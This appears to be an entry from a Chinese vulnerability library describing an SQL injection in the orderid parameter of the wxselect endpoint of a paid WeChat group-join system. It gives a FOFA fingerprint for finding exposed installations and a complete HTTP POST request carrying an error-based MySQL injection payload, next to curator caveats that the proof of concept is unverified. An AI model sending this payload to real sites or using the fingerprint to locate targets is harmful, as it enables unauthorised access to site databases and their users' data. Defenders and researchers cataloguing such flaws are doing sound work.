---
source: "wy876 漏洞文库"
title: "九块九付费进群系统 wxselect orderid SQL注入"
product: "九块九付费进群系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本/厂商未知；MySQL GTID_SUBSET"
prerequisites: "无Cookie请求，鉴权未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bdvfpxsyrd03yo6q"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%B9%9D%E5%9D%97%E4%B9%9D%E4%BB%98%E8%B4%B9%E8%BF%9B%E7%BE%A4/%E4%B9%9D%E5%9D%97%E4%B9%9D%E4%BB%98%E8%B4%B9%E8%BF%9B%E7%BE%A4%E7%B3%BB%E7%BB%9Fwxselect%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/website/index/login.html\""
id: "vw-2c931c36b6f8c3a5283f833b"
entity_id: "ve-2c931c36b6f8c3a5283f833b"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 九块九付费进群系统 wxselect orderid SQL注入

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：九块九付费进群系统；wxselect orderid SQL注入
- 版本、配置及部署条件：版本/厂商未知；MySQL GTID_SUBSET
- 认证与权限前提：无Cookie请求，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同时提供基准orderid=1和注入请求有比较意图，但两者响应均缺失
- 系统介绍把九块九商业模式当产品定义，需明确源码发行方/构建
- HTTP误标Go，缺修复或根因来源；不能仅载荷确认成功

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
九块九付费进群系统是一种新的社群管理方式，用户通过支付9.9元人民币即可加入特定的微信群，享受群内提供的服务或资源。这种模式通常用于知识分享、资源下载、专业交流等社群，通过设置门槛来筛选成员，提高群组的专业性和互动质量。

## 二、影响版本
+ 九块九付费进群系统

## 三、资产测绘
+ fofa`body="/website/index/login.html"`
+ 特征


## 四、漏洞复现
```http
POST /group/index/wxselect HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
 
orderid=') AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x7e)),1,190))),5417)-- ylIU
```


```http
POST /group/index/wxselect HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Content-Type: application/x-www-form-urlencoded
 
orderid=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bdvfpxsyrd03yo6q>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
